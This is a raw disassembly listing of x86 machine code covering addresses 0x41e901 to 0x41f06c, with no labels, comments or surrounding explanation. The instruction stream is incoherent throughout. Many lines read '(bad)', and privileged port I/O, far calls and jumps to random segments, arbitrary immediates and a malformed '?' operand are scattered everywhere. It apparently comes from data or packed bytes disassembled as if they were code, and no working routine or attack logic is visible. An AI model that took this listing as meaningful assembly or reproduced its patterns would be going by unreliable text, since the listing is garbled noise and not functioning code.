  41e901:	mov    al,ds:0x8c3c7260
  41e906:	cs scas al,BYTE PTR es:[edi]
  41e908:	loopne 0x41e987
  41e90a:	dec    esp
  41e90b:	xor    al,0xaf
  41e90d:	xor    eax,0xff985892
  41e912:	jle    0x41e907
  41e914:	loop   0x41e8dc
  41e916:	mov    dl,0xf8
  41e918:	mov    dh,0x51
  41e91a:	jne    0x41e8e0
  41e91c:	mov    esi,0x9c8754e4
  41e921:	inc    esp
  41e922:	test   eax,0xf89e805a
  41e927:	(bad)  
  41e928:	adc    al,ah
  41e92a:	inc    edx
  41e92b:	not    cl
  41e92d:	pop    es
  41e92e:	mov    bl,bh
  41e930:	imul   ebp,DWORD PTR [edx+0xf],0x1e
  41e934:	dec    ebp
  41e935:	xchg   ebx,eax
  41e936:	xlat   BYTE PTR ds:[ebx]
  41e937:	push   0xbaf8382d
  41e93c:	dec    ecx
  41e93d:	bts    DWORD PTR [esp+edi*8+0x6e],0xe1
  41e943:	push   es
  41e944:	push   edi
  41e945:	test   al,0xa6
  41e947:	pop    ss
  41e948:	int    0x26
  41e94a:	imul   DWORD PTR [ecx-0xe]
  41e94d:	das    
  41e94e:	mov    ebp,0x36a8ae9d
  41e953:	aad    0x97
  41e955:	aad    0x40
  41e957:	lea    ebp,[edi+0x2a]
  41e95a:	cmp    dh,ch
  41e95c:	test   eax,0x5aadd514
  41e961:	sub    eax,0xa1566bd6
  41e966:	sbb    bl,BYTE PTR [eax+0x3661b475]
  41e96c:	aam    0x6e
  41e96e:	aam    0xe1
  41e970:	stos   DWORD PTR es:[edi],eax
  41e971:	or     DWORD PTR [ebp-0x77b7e7b8],ecx
  41e977:	call   0xc994:0xb180f204
  41e97e:	lahf   
  41e97f:	add    dl,BYTE PTR [esi]
  41e981:	push   cs
  41e982:	push   eax
  41e983:	fsub   DWORD PTR [ecx]
  41e985:	jl     0x41e931
  41e987:	shl    DWORD PTR ds:0xb019f2a1,0x5b
  41e98e:	dec    edi
  41e98f:	stos   BYTE PTR es:[edi],al
  41e990:	sar    cl,1
  41e992:	hlt    
  41e993:	dec    esp
  41e994:	loope  0x41e9a1
  41e996:	or     eax,edi
  41e998:	mov    ch,0xa7
  41e99a:	daa    
  41e99b:	and    BYTE PTR [ecx+ebx*4+0x7ccb61a9],ah
  41e9a2:	dec    DWORD PTR [edx+0x14169382]
  41e9a8:	sbb    BYTE PTR [edx+0x4f],ch
  41e9ab:	mov    fs,WORD PTR [eax]
  41e9ad:	push   eax
  41e9ae:	add    al,0x4b
  41e9b0:	mov    eax,0xa46bd5f5
  41e9b5:	ficom  DWORD PTR [eax+0x6d]
  41e9b8:	je     0x41ea0c
  41e9ba:	inc    ecx
  41e9bb:	jl     0x41ea33
  41e9bd:	into   
  41e9be:	sub    bh,BYTE PTR [esi]
  41e9c0:	pop    es
  41e9c1:	scas   eax,DWORD PTR es:[edi]
  41e9c2:	les    esp,FWORD PTR [eax+ebp*8]
  41e9c5:	push   ebx
  41e9c6:	clc    
  41e9c7:	mov    es:0xe58e1801,al
  41e9cd:	sub    esi,DWORD PTR [edx]
  41e9cf:	sar    BYTE PTR [edx+esi*8],1
  41e9d2:	nop
  41e9d3:	cmp    DWORD PTR [esi+0x11],ebp
  41e9d6:	pop    edx
  41e9d7:	push   edx
  41e9d8:	int    0xdc
  41e9da:	das    
  41e9db:	rcr    al,cl
  41e9dd:	test   bl,bl
  41e9df:	das    
  41e9e0:	aam    0xee
  41e9e2:	inc    eax
  41e9e3:	inc    esi
  41e9e4:	jecxz  0x41ea61
  41e9e6:	and    ch,BYTE PTR [edx]
  41e9e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e9e9:	sub    al,0x30
  41e9eb:	and    eax,0x75ad158
  41e9f0:	lods   eax,DWORD PTR ds:[esi]
  41e9f1:	(bad)  
  41e9f2:	fidiv  WORD PTR [eax]
  41e9f4:	punpckldq mm0,DWORD PTR [edi-0x9dde015]
  41e9fb:	xchg   ebp,eax
  41e9fc:	and    ecx,DWORD PTR [ebp+0x66]
  41e9ff:	mov    edi,0x292da40d
  41ea04:	(bad)  
  41ea06:	xor    ebp,ecx
  41ea08:	fisub  DWORD PTR [ebx+0x62]
  41ea0b:	pop    edi
  41ea0c:	fs pop esp
  41ea0e:	push   ds
  41ea0f:	or     eax,0x95d4befb
  41ea14:	shr    BYTE PTR [ebx-0x2367b386],0x25
  41ea1b:	add    eax,0x23feb654
  41ea20:	mov    ecx,0xd2a0c815
  41ea25:	ficom  DWORD PTR [edx+0x17]
  41ea28:	pminub mm5,mm1
  41ea2b:	loop   0x41ea8a
  41ea2d:	and    ch,BYTE PTR [ebx-0xd]
  41ea30:	sahf   
  41ea31:	adc    ebp,edx
  41ea33:	sbb    al,0xc6
  41ea35:	int    0x10
  41ea37:	aad    0xfe
  41ea39:	inc    ebp
  41ea3a:	mov    edx,0x52b57fad
  41ea3f:	cwde   
  41ea40:	mov    esp,0xcfddefac
  41ea45:	shl    BYTE PTR [edx+0x74f8b09e],cl
  41ea4b:	retf   0x6f33
  41ea4e:	sbb    al,0x2b
  41ea50:	(bad)  
  41ea51:	pop    ds
  41ea52:	fidiv  WORD PTR [esi]
  41ea54:	mov    DWORD PTR [edi+0x65],edi
  41ea57:	test   eax,0x8d56c34c
  41ea5c:	aad    0xea
  41ea5e:	pop    edx
  41ea5f:	comiss xmm6,xmm1
  41ea62:	out    0x7b,eax
  41ea64:	int3   
  41ea65:	add    al,0x75
  41ea67:	cmp    ebx,DWORD PTR [bp-0x3cc]
  41ea6c:	xchg   BYTE PTR [ebp-0x1471a456],al
  41ea72:	fbstp  TBYTE PTR [ecx+0x508946c7]
  41ea78:	call   0xa205:0x6a22391d
  41ea7f:	loopne 0x41eae7
  41ea81:	pop    esi
  41ea82:	push   esp
  41ea83:	mov    ecx,0xfd28dd10
  41ea88:	bnd jp 0x41ea0f
  41ea8b:	xchg   edi,eax
  41ea8c:	int3   
  41ea8d:	shl    BYTE PTR [edx+0x4a],cl
  41ea90:	inc    ebp
  41ea91:	sbb    al,0xe6
  41ea93:	call   0x88b6:0x85b90f47
  41ea9a:	(bad)  
  41ea9b:	std    
  41ea9c:	clc    
  41ea9d:	xchg   edx,eax
  41ea9e:	call   0x14:0xb7dcedc8
	...
  41eab1:	jle    0x41ea75
  41eab3:	in     al,dx
  41eab4:	push   cs
  41eab5:	cld    
  41eab6:	cs (bad) 
  41eab8:	repnz lods eax,DWORD PTR ds:[esi]
  41eaba:	add    BYTE PTR [eax],bl
  41eabc:	xor    al,0xd0
  41eabe:	test   eax,0x65c16911
  41eac3:	add    DWORD PTR [eax],eax
  41eac5:	stos   DWORD PTR es:[edi],eax
  41eac6:	add    eax,DWORD PTR [eax]
  41eac8:	add    BYTE PTR [ebx-0x79],dh
  41eacb:	stos   BYTE PTR es:[edi],al
  41eacc:	cmp    BYTE PTR [ecx-0x2c67b328],0x9b
  41ead3:	leave  
  41ead4:	inc    edi
  41ead5:	pushf  
  41ead6:	push   ds
  41ead7:	inc    eax
  41ead8:	fs xor ecx,0xfffffffc
  41eadc:	inc    ebp
  41eadd:	cli    
  41eade:	mov    esi,0x64e8f6fb
  41eae3:	adc    esi,DWORD PTR [esi+0x4a]
  41eae6:	ins    DWORD PTR es:[edi],dx
  41eae7:	xor    dh,BYTE PTR [esi-0x7144fd40]
  41eaed:	outs   dx,BYTE PTR ds:[esi]
  41eaee:	outs   dx,BYTE PTR ds:[esi]
  41eaef:	push   edi
  41eaf0:	lahf   
  41eaf1:	cmp    esi,esp
  41eaf3:	jmp    0x1e3a:0x169d2fed
  41eafa:	pop    ds
  41eafb:	stos   BYTE PTR es:[edi],al
  41eafc:	div    DWORD PTR [edi+0x2c76879]
  41eb02:	lock popf 
  41eb04:	out    dx,al
  41eb05:	inc    edx
  41eb06:	test   dh,0xa8
  41eb09:	push   cs
  41eb0a:	mov    esp,DWORD PTR [eax-0x3fdfec5c]
  41eb10:	imul   ebp,ebx,0xffffffe6
  41eb13:	mov    esp,0x32b7391c
  41eb18:	data16 in al,0x94
  41eb1b:	sbb    edx,DWORD PTR gs:0xed0cb011
  41eb22:	jp     0x41eb9c
  41eb24:	nop
  41eb25:	hlt    
  41eb26:	int    0x27
  41eb28:	add    BYTE PTR [esi+0x6c24010a],bl
  41eb2e:	dec    esp
  41eb2f:	cmc    
  41eb30:	mov    edi,0x70b82ac9
  41eb35:	push   edi
  41eb36:	shl    DWORD PTR [edx],0x65
  41eb39:	rcr    DWORD PTR [edx+0x2b3161ce],0x86
  41eb40:	or     esp,DWORD PTR gs:[esi]
  41eb43:	xor    al,0x32
  41eb45:	(bad)  
  41eb46:	mov    bh,0x71
  41eb48:	je     0x41eb60
  41eb4a:	ins    BYTE PTR es:[edi],dx
  41eb4b:	aaa    
  41eb4c:	pop    eax
  41eb4d:	dec    esp
  41eb4e:	es jbe 0x41eb48
  41eb51:	inc    edx
  41eb52:	dec    esp
  41eb53:	popf   
  41eb54:	fisttp QWORD PTR [esi-0x41]
  41eb57:	ja     0x41eaf7
  41eb59:	mov    bl,0xc
  41eb5b:	dec    esi
  41eb5c:	add    al,0xf6
  41eb5e:	mov    dl,0x88
  41eb60:	lds    ecx,FWORD PTR [edi]
  41eb62:	into   
  41eb63:	jns    0x41eb8f
  41eb65:	aaa    
  41eb66:	mov    edi,0xe617ddc6
  41eb6b:	enter  0xee98,0x54
  41eb6f:	pop    esi
  41eb70:	fwait
  41eb71:	(bad)  
  41eb72:	ins    BYTE PTR es:[edi],dx
  41eb73:	in     eax,dx
  41eb74:	icebp  
  41eb75:	lea    edi,[ebp+0x6d6ac4a3]
  41eb7b:	pushf  
  41eb7c:	repnz push edi
  41eb7e:	sar    BYTE PTR [ecx],1
  41eb80:	and    eax,0xf7f89898
  41eb85:	and    DWORD PTR [edi+0x272414f2],ecx
  41eb8b:	mov    dl,0x18
  41eb8d:	cmp    al,0x28
  41eb8f:	sub    eax,0x2bc5686d
  41eb94:	adc    cl,dl
  41eb96:	out    0x11,al
  41eb98:	inc    ecx
  41eb99:	sub    DWORD PTR [ebp+0x25],ecx
  41eb9c:	ret    0x3678
  41eb9f:	xlat   BYTE PTR ds:[ebx]
  41eba0:	outs   dx,BYTE PTR ds:[esi]
  41eba1:	cmc    
  41eba2:	or     esp,DWORD PTR ds:0x1ab3930e
  41eba8:	push   edx
  41eba9:	pusha  
  41ebaa:	pop    es
  41ebab:	cmp    al,0x89
  41ebad:	int    0x65
  41ebaf:	mul    BYTE PTR [edi-0x1e]
  41ebb2:	aam    0xbf
  41ebb4:	mov    al,ds:0xc3bb8c0a
  41ebb9:	je     0x41ebed
  41ebbb:	imul   edi,DWORD PTR [esi-0x6b6be12e],0xffffff9a
  41ebc2:	(bad)  
  41ebc3:	aam    0x27
  41ebc5:	pushf  
  41ebc6:	inc    esp
  41ebc7:	xor    eax,0xb302bdab
  41ebcc:	jmp    0xeb9ab713
  41ebd1:	popa   
  41ebd2:	das    
  41ebd3:	inc    edx
  41ebd4:	xchg   esi,eax
  41ebd5:	jle    0x41eb8d
  41ebd7:	test   BYTE PTR [ebx-0x6f555146],ch
  41ebdd:	dec    ebp
  41ebde:	into   
  41ebdf:	stos   DWORD PTR es:[edi],eax
  41ebe0:	loopne 0x41ebce
  41ebe2:	adc    esp,esi
  41ebe4:	loopne 0x41ec19
  41ebe6:	dec    edx
  41ebe7:	add    BYTE PTR [ecx+0x28],cl
  41ebea:	add    DWORD PTR ds:0xe392b79d,ebx
  41ebf0:	cli    
  41ebf1:	xor    al,BYTE PTR [esi+0x68]
  41ebf4:	jp     0x41eb91
  41ebf6:	sub    bh,BYTE PTR [edx+edx*2]
  41ebf9:	js     0x41ec71
  41ebfb:	adc    edx,ecx
  41ebfd:	es push 0xbbb0011b
  41ec03:	fldlg2 
  41ec05:	sahf   
  41ec06:	pop    edi
  41ec07:	mov    esi,0x7cb0600
  41ec0c:	shl    DWORD PTR [ebp-0x23],cl
  41ec0f:	dec    esp
  41ec10:	sar    eax,1
  41ec12:	cmc    
  41ec13:	jno    0x41ebac
  41ec15:	and    BYTE PTR [ecx+0xf],dl
  41ec18:	sti    
  41ec19:	pop    ebp
  41ec1a:	out    0xfa,al
  41ec1c:	popf   
  41ec1d:	sub    edi,esp
  41ec1f:	sub    eax,0x90c3a959
  41ec24:	shl    BYTE PTR [ecx],1
  41ec26:	mov    al,ds:0xc6bb6a34
  41ec2b:	inc    esp
  41ec2c:	retf   
  41ec2d:	shr    BYTE PTR [ecx+0x3f],0xea
  41ec31:	or     eax,DWORD PTR [edx+0x7d]
  41ec34:	sbb    ebx,DWORD PTR [ecx+0x685a3d2d]
  41ec3a:	fild   DWORD PTR [esi]
  41ec3c:	pop    edx
  41ec3d:	dec    eax
  41ec3e:	mov    al,0xee
  41ec40:	lods   al,BYTE PTR ds:[esi]
  41ec41:	add    al,0xb
  41ec43:	jae    0x41ecbe
  41ec45:	push   es
  41ec46:	or     ah,BYTE PTR ds:0xdf06157f
  41ec4c:	cmp    al,0x6a
  41ec4e:	jne    0x41eccd
  41ec50:	test   eax,0x65668799
  41ec55:	imul   esi,DWORD PTR [ecx+0x14],0x5d7b0e98
  41ec5c:	shr    bh,cl
  41ec5e:	xor    eax,0x5d2676df
  41ec63:	mov    ds:0xeaee119f,eax
  41ec68:	aam    0x5c
  41ec6a:	popa   
  41ec6b:	aad    0x5b
  41ec6d:	mov    ds:0x86d69b66,eax
  41ec72:	das    
  41ec73:	mov    ecx,0xc4fae672
  41ec78:	iret   
  41ec79:	int3   
  41ec7a:	lds    edx,FWORD PTR [edx-0x1d]
  41ec7d:	jge    0x41ec3b
  41ec7f:	dec    esi
  41ec80:	fstp   TBYTE PTR [ecx]
  41ec82:	sbb    ebx,DWORD PTR [edx]
  41ec84:	clc    
  41ec85:	cdq    
  41ec86:	fldcw  WORD PTR [esi-0x56]
  41ec89:	pop    edi
  41ec8a:	cdq    
  41ec8b:	bound  esp,QWORD PTR [ebp+0x1fc2491d]
  41ec91:	aam    0x18
  41ec93:	pop    ecx
  41ec94:	aad    0x88
  41ec96:	xchg   ebp,eax
  41ec97:	and    al,0xb
  41ec99:	or     al,0x3f
  41ec9b:	cmp    esp,ebx
  41ec9d:	clc    
  41ec9e:	mov    cl,0x47
  41eca0:	stos   DWORD PTR es:[edi],eax
  41eca1:	fxch   st(4)
  41eca3:	add    ch,BYTE PTR es:[ebp+ecx*8-0x5c2ef6b5]
  41ecab:	mov    esp,0x1fc65769
  41ecb0:	xchg   ebp,eax
  41ecb1:	(bad)  
  41ecb2:	std    
  41ecb3:	push   es
  41ecb4:	clc    
  41ecb5:	push   esi
  41ecb6:	inc    edi
  41ecb7:	mov    esp,0x465b6bd1
  41ecbc:	rcl    DWORD PTR ds:0x7404addf,cl
  41ecc2:	push   ds
  41ecc3:	dec    eax
  41ecc4:	cmp    dl,al
  41ecc6:	jl     0x41ed0b
  41ecc8:	mov    ebp,0xd06d372b
  41eccd:	pop    ebp
  41ecce:	out    dx,eax
  41eccf:	mov    esp,0x3bb2d98a
  41ecd4:	and    BYTE PTR [eax-0x20e9f5ea],ah
  41ecda:	leave  
  41ecdb:	jbe    0x41ecef
  41ecdd:	lock jbe 0x41ec7c
  41ece0:	enter  0x7b34,0x22
  41ece4:	std    
  41ece5:	call   0x6ad0:0xa8238493
  41ecec:	mov    edi,0x7447f535
  41ecf1:	inc    eax
  41ecf2:	xlat   BYTE PTR ds:[ebx]
  41ecf3:	(bad)  
  41ecf4:	mov    eax,ds:0xb9c8af8b
  41ecf9:	addr16 mov ch,0xcb
  41ecfc:	outs   dx,BYTE PTR ds:[esi]
  41ecfd:	xchg   ebx,eax
  41ecfe:	push   ebx
  41ecff:	(bad)  
  41ed00:	cld    
  41ed01:	hlt    
  41ed02:	ret    0xc043
  41ed05:	pop    ss
  41ed06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ed07:	fs push ds
  41ed09:	push   ds
  41ed0a:	mov    es,ebx
  41ed0c:	sbb    DWORD PTR [edx+0x68359d39],edi
  41ed12:	les    ebp,FWORD PTR [edx]
  41ed14:	inc    edi
  41ed15:	fmul   QWORD PTR [edx]
  41ed17:	cmp    DWORD PTR [edi+0x12],esp
  41ed1a:	pop    edx
  41ed1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ed1c:	clc    
  41ed1d:	cwde   
  41ed1e:	adc    BYTE PTR [ecx-0x240554e8],ah
  41ed24:	push   cs
  41ed25:	xchg   edx,eax
  41ed26:	les    esp,FWORD PTR [ecx+0x4f]
  41ed29:	xchg   ecx,eax
  41ed2a:	dec    ecx
  41ed2b:	mov    dh,0xe2
  41ed2d:	les    ebx,FWORD PTR [ebp-0x21]
  41ed30:	xchg   DWORD PTR [eax+0x58],esi
  41ed33:	and    DWORD PTR [edx+0x14c2f1b9],ebp
  41ed39:	in     eax,dx
  41ed3a:	arpl   WORD PTR [ecx],ax
  41ed3c:	(bad)  
  41ed3d:	and    eax,0xf2dcfcbb
  41ed42:	mov    ch,0x69
  41ed44:	ja     0x41ed7a
  41ed46:	mov    esi,0xa2699dce
  41ed4b:	mov    eax,0xefc9eb34
  41ed50:	adc    DWORD PTR ds:0x4702b218,ebx
  41ed56:	or     edx,DWORD PTR [eax]
  41ed58:	sbb    dh,dl
  41ed5a:	dec    edi
  41ed5b:	xchg   edi,eax
  41ed5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ed5d:	xchg   esi,eax
  41ed5e:	sbb    al,0x25
  41ed60:	xor    dh,BYTE PTR [edx+0x14acbbdd]
  41ed66:	inc    ebp
  41ed67:	int    0x43
  41ed69:	xor    eax,0xec998a4f
  41ed6e:	cld    
  41ed6f:	push   eax
  41ed70:	shl    eax,cl
  41ed72:	and    eax,0x40d8ecd
  41ed77:	cmc    
  41ed78:	rcr    DWORD PTR [esi-0x17],cl
  41ed7b:	das    
  41ed7c:	mov    ecx,0x1670f3d3
  41ed81:	mov    gs,ecx
  41ed83:	not    DWORD PTR [ebx]
  41ed85:	test   DWORD PTR [edi],ecx
  41ed87:	sbb    BYTE PTR ds:[ebx-0x36b305f2],ah
  41ed8e:	(bad)  
  41ed8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ed90:	pop    esp
  41ed91:	rcr    DWORD PTR [ecx-0x19],1
  41ed94:	retf   0x344f
  41ed97:	pusha  
  41ed98:	dec    eax
  41ed9a:	fcomp  QWORD PTR [eax+edx*8+0x58]
  41ed9e:	stos   BYTE PTR es:[edi],al
  41ed9f:	sub    dh,BYTE PTR [ecx+0x10f9b185]
  41eda5:	shr    dl,cl
  41eda7:	and    bh,bh
  41eda9:	out    dx,eax
  41edaa:	sbb    DWORD PTR [edi+0x54ebe327],eax
  41edb0:	dec    ebx
  41edb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41edb2:	(bad)  
  41edb3:	jmp    0x41ee1f
  41edb5:	mov    ch,BYTE PTR [eax-0x6e9e4071]
  41edbb:	cmp    BYTE PTR [esi],0x1b
  41edbe:	dec    esi
  41edbf:	and    eax,0xca259483
  41edc4:	imul   esp,DWORD PTR [ecx],0x873f7be8
  41edca:	pop    es
  41edcb:	retf   
  41edcc:	mov    ?,WORD PTR [esi-0x3f]
  41edcf:	cmp    eax,0xcaded5f
  41edd4:	nop
  41edd5:	outs   dx,BYTE PTR ds:[esi]
  41edd6:	push   ecx
  41edd7:	inc    edx
  41edd8:	mov    DWORD PTR [edx+0x763f6080],edx
  41edde:	xchg   BYTE PTR [ebp+0x77],cl
  41ede1:	cwde   
  41ede2:	push   esi
  41ede3:	test   DWORD PTR [edi],esp
  41ede5:	mov    eax,0x287b0dea
  41edea:	jae    0x41ed8d
  41edec:	mov    esp,DWORD PTR [esi]
  41edee:	pop    ss
  41edef:	repz xlat BYTE PTR ds:[ebx]
  41edf1:	push   eax
  41edf2:	cmp    BYTE PTR [esi+eax*1-0x4129ccfa],bh
  41edf9:	add    al,0xd8
  41edfb:	inc    ecx
  41edfc:	pop    ds
  41edfd:	div    DWORD PTR [eax]
  41edff:	jecxz  0x41ee3a
  41ee01:	rcr    BYTE PTR [edx-0x1c9a7ce5],0xa7
  41ee08:	pop    ds
  41ee09:	jg     0x41ed9e
  41ee0b:	xor    dh,bh
  41ee0d:	sar    DWORD PTR [ecx+0x108188cf],1
  41ee13:	mov    esp,0xd04463c6
  41ee18:	outs   dx,DWORD PTR ds:[esi]
  41ee19:	ror    ebx,cl
  41ee1b:	in     eax,dx
  41ee1c:	jo     0x41ee14
  41ee1e:	repnz fild WORD PTR [esi-0x1f466059]
  41ee25:	jp     0x41edc2
  41ee27:	ds pop ebx
  41ee29:	div    BYTE PTR ds:0x5117b3c7
  41ee2f:	in     eax,0x78
  41ee31:	dec    ebx
  41ee32:	push   ecx
  41ee33:	add    al,BYTE PTR [ebp+0x35594ea1]
  41ee39:	xchg   ebx,eax
  41ee3a:	test   DWORD PTR [edx],edx
  41ee3c:	mov    dl,0x89
  41ee3e:	aaa    
  41ee3f:	lea    ecx,[ebx]
  41ee41:	(bad)  
  41ee42:	jl     0x41ee27
  41ee44:	sbb    bl,BYTE PTR [ecx+ecx*2-0x501a64dc]
  41ee4b:	push   esp
  41ee4c:	sub    esi,ecx
  41ee4e:	popf   
  41ee4f:	arpl   WORD PTR [eax],ax
  41ee51:	adc    DWORD PTR [edx],esi
  41ee53:	jle    0x41ee07
  41ee55:	or     DWORD PTR [edi-0x44],ebp
  41ee58:	mov    ecx,0x798dd4fb
  41ee5d:	out    dx,al
  41ee5e:	je     0x41edea
  41ee60:	iret   
  41ee61:	fisttp WORD PTR ds:0x779ae1c6
  41ee67:	or     DWORD PTR [esi+0x48b750a5],ebp
  41ee6d:	test   al,0xb0
  41ee6f:	mov    dl,0x7a
  41ee71:	ret    
  41ee72:	popf   
  41ee73:	cmp    al,0x0
	...
  41ee81:	dec    esi
  41ee82:	leave  
  41ee83:	(bad)  [edi+ebx*8+0x5c]
  41ee87:	(bad)  
  41ee89:	mov    al,ds:0x612f76e4
  41ee8e:	add    DWORD PTR [edx+0x1696cee],ebp
  41ee94:	add    BYTE PTR [ebx+0xa000003],ch
  41ee9a:	sahf   
  41ee9b:	mov    dl,0xaf
  41ee9d:	das    
  41ee9e:	(bad)  
  41ee9f:	cli    
  41eea0:	pop    edx
  41eea1:	dec    edi
  41eea2:	jne    0x41eef6
  41eea4:	jae    0x41ee60
  41eea6:	bound  ecx,QWORD PTR [eax-0x3f]
  41eea9:	cli    
  41eeaa:	xor    al,0xa8
  41eeac:	sti    
  41eead:	enter  0x81e,0x9c
  41eeb1:	in     al,dx
  41eeb2:	and    eax,0x8ab09b52
  41eeb7:	jmp    0x9e33:0x7e1c9a
  41eebe:	aam    0x73
  41eec0:	popf   
  41eec1:	in     al,0x35
  41eec3:	xchg   ecx,eax
  41eec4:	xor    dl,BYTE PTR [edi+0x25]
  41eec7:	out    0x5c,al
  41eec9:	(bad)  
  41eeca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eecb:	mov    al,ds:0x87064bd1
  41eed0:	xor    BYTE PTR [esi-0x12],ah
  41eed3:	jne    0x41eee7
  41eed5:	das    
  41eed6:	(bad)  
  41eed7:	jnp    0x41eea7
  41eed9:	cmp    bh,BYTE PTR gs:[esi+0xa595735]
  41eee0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eee1:	jg     0x41ee71
  41eee3:	mov    edi,edx
  41eee5:	iret   
  41eee6:	pop    ebx
  41eee7:	inc    eax
  41eee8:	and    eax,0xa80677d1
  41eeed:	ret    
  41eeee:	outs   dx,DWORD PTR ds:[esi]
  41eeef:	adc    DWORD PTR [ecx+0x1317f3e9],edx
  41eef5:	repnz and bh,BYTE PTR [ebx+0x48d7be96]
  41eefc:	push   esp
  41eefd:	aaa    
  41eefe:	fstp   DWORD PTR [eax+ebx*2+0x7b5cdaf9]
  41ef05:	(bad)  
  41ef06:	js     0x41eedf
  41ef08:	adc    dh,BYTE PTR [edx+0x57cc025d]
  41ef0e:	push   edx
  41ef0f:	inc    eax
  41ef10:	mov    edi,0xcfe757bf
  41ef15:	test   al,0x1a
  41ef17:	ret    0x5a96
  41ef1a:	nop
  41ef1b:	add    al,BYTE PTR [edi-0x72]
  41ef1e:	ret    
  41ef1f:	int    0x8d
  41ef21:	aam    0xfd
  41ef23:	pop    ebx
  41ef24:	xor    ah,BYTE PTR [ebp-0x6]
  41ef27:	mov    edi,0x60cfdda5
  41ef2c:	mov    ecx,0x3370172
  41ef31:	ins    DWORD PTR es:[edi],dx
  41ef32:	repnz shr DWORD PTR [eax+ebp*2+0x50],0xdc
  41ef38:	inc    edi
  41ef39:	cmc    
  41ef3a:	jno    0x41ef84
  41ef3c:	pop    ebp
  41ef3d:	inc    ebp
  41ef3e:	es inc edx
  41ef40:	in     al,0x47
  41ef42:	push   cs
  41ef43:	pop    ebp
  41ef44:	test   eax,0x2bd0a83
  41ef49:	or     DWORD PTR [ebx-0x73],edx
  41ef4c:	js     0x41ef58
  41ef4e:	mov    dl,0x80
  41ef50:	mov    BYTE PTR [edi-0x12],0x47
  41ef54:	jno    0x41efd1
  41ef56:	or     dl,BYTE PTR [edx+0x58]
  41ef59:	adc    BYTE PTR [ebp+0x1e],ch
  41ef5c:	mov    ds,WORD PTR [edi+edx*2-0x14]
  41ef60:	and    edi,DWORD PTR [edx+0xadb813d]
  41ef66:	mov    eax,0x5809c547
  41ef6b:	and    al,0xcd
  41ef6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef6e:	push   cs
  41ef6f:	sahf   
  41ef70:	addr16 push 0x1a
  41ef73:	mov    bh,0x81
  41ef75:	adc    edx,edi
  41ef77:	add    al,0xb6
  41ef79:	fs xor cl,cl
  41ef7c:	xchg   edx,eax
  41ef7d:	xchg   edx,eax
  41ef7e:	mov    ebp,eax
  41ef80:	mov    eax,ds:0xc7419ee3
  41ef85:	int3   
  41ef86:	fld    QWORD PTR [esi]
  41ef88:	xchg   BYTE PTR [ecx+0x4f],dh
  41ef8b:	call   DWORD PTR [ebx+eax*2]
  41ef8e:	retf   0x646a
  41ef91:	hlt    
  41ef92:	out    dx,al
  41ef93:	addr16 push edi
  41ef95:	lds    ebx,FWORD PTR [edx-0x6e]
  41ef98:	call   0xa786:0x16c7596
  41ef9f:	xchg   esi,eax
  41efa0:	sbb    BYTE PTR [esi+0x1f],0x59
  41efa4:	out    0x21,al
  41efa6:	sbb    al,BYTE PTR [esi-0x25]
  41efa9:	xchg   ebx,eax
  41efaa:	mov    ds:0x2ea90b71,al
  41efaf:	xchg   ebp,eax
  41efb0:	repnz mov dh,0xbf
  41efb3:	out    dx,al
  41efb4:	(bad)  
  41efb5:	out    dx,eax
  41efb6:	in     eax,dx
  41efb7:	sbb    al,0xc4
  41efb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41efba:	lods   eax,DWORD PTR ds:[esi]
  41efbb:	das    
  41efbc:	pop    esp
  41efbd:	jecxz  0x41ef5d
  41efbf:	xor    eax,0x1a207b39
  41efc4:	push   edx
  41efc5:	das    
  41efc6:	sti    
  41efc7:	cmp    BYTE PTR ds:0x8606dc3d,dl
  41efcd:	ja     0x41efea
  41efcf:	data16 cld 
  41efd1:	cli    
  41efd2:	mov    ebp,0xabc411f3
  41efd7:	clc    
  41efd8:	mov    bh,0x24
  41efda:	ret    0xe144
  41efdd:	jp     0x41f04d
  41efdf:	xchg   edi,eax
  41efe0:	xlat   BYTE PTR ds:[ebx]
  41efe1:	dec    esi
  41efe2:	jmp    0x5a0b3b5e
  41efe7:	imul   ecx,DWORD PTR [ebx+0x184dc9f4],0x5d2b7953
  41eff1:	call   0x7e37a25e
  41eff6:	popa   
  41eff7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eff8:	cmp    esp,DWORD PTR [esi-0x8]
  41effb:	xchg   esp,eax
  41effc:	mov    dh,0xe8
  41effe:	and    al,0x52
  41f000:	shr    DWORD PTR [edi+0x789ce0f1],1
  41f006:	dec    ebx
  41f007:	pop    ds
  41f008:	dec    ebp
  41f009:	push   ecx
  41f00a:	fisttp QWORD PTR [ecx+0x67]
  41f00d:	arpl   WORD PTR [eax],dx
  41f00f:	cmove  edx,DWORD PTR [esi]
  41f012:	sub    DWORD PTR [edx+0x58],esi
  41f015:	aas    
  41f016:	inc    eax
  41f017:	neg    BYTE PTR [esi]
  41f019:	push   cs
  41f01a:	pop    es
  41f01b:	dec    esp
  41f01c:	cmp    DWORD PTR [esi+0x7c],edx
  41f01f:	fild   DWORD PTR [edx]
  41f021:	push   esp
  41f022:	mov    esp,0xacaec32f
  41f027:	and    eax,0xae0400f1
  41f02d:	xchg   DWORD PTR [ecx+ecx*2],ebx
  41f030:	int3   
  41f031:	cmp    edi,eax
  41f033:	sbb    dl,BYTE PTR fs:[edi+eax*4-0x49a42438]
  41f03b:	jecxz  0x41f053
  41f03d:	or     ecx,DWORD PTR [esp+edi*4+0x612eb6d1]
  41f044:	push   0xa064335b
  41f049:	jno    0x41f013
  41f04b:	dec    esi
  41f04c:	mov    al,0x6d
  41f04e:	add    eax,0xdc806ed5
  41f053:	ds mov bh,0xe0
  41f056:	fwait
  41f057:	pushf  
  41f058:	stos   DWORD PTR es:[edi],eax
  41f059:	out    0xbe,al
  41f05b:	mov    fs,WORD PTR [eax+0x28]
  41f05e:	leave  
  41f05f:	sub    al,0xc8
  41f061:	int3   
  41f062:	mov    eax,0x892013fe
  41f067:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f068:	sub    bl,cl
  41f06a:	je     0x41f053
  41f06c:	test   al,0xda
